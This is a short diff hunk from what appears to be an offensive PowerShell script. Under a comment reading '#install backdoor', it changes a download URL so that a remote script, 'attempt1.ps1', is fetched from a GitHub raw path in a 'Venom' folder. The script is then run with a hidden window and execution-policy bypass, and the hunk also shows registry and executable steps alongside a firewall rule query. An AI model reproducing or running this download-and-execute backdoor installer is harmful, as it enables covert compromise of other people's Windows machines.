@@ -63,7 +63,7 @@ Get-NetFirewallRule -Name *ssh*
 ./wrev.reg; ./calty
 
 #install backdoor
-Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/exe/attempt1.ps1 -OutFile "attempt1.ps1"
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/exe/attempt1.ps1 -OutFile "attempt1.ps1"
 
 powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.ps1
 
